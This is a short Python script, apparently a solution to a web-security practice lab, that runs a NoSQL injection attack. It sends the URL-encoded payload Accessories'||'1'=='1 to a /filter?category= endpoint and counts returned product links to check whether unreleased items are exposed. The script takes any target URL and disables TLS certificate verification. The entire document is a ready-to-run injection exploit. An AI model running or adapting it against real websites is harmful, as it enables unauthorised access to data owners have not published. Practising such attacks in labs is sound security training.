#! /usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_01(url, payload):

    uri = '/filter?category='

    normal = requests.get(url + uri + "Accessories", verify=False)
    normal_items = normal.text.count('href="/product?productId=')

    r = requests.get(url + uri + payload, verify=False)
    items = r.text.count('href="/product?productId=')

    print(f"[+] Normal released items: {normal_items}")
    print(f"[+] Released and unreleased items: {items}")

    return items > normal_items


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    url = sys.argv[1].strip().rstrip("/")
    payload = "Accessories%27%7c%7c%27%31%27%3d%3d%27%31"

    if sqli_01(url, payload):
        print("[+] NoSQLi successful, all items returned")
    else:
        print("[-] NoSQLi unsuccessful :(")


if __name__ == "__main__":
    main()